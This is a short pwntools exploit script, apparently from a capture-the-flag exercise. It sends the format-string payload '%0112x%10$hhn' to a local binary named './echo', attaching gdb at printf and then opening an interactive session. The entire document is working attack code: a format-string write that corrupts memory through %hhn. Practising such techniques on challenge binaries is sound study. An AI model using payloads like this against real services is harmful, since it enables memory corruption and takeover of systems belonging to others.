from pwn import *

payload = '%0112x%10$hhn'

r = process('./echo')
gdb.attach(r, 'b printf\nfin')
r.sendline(payload)
r.interactive()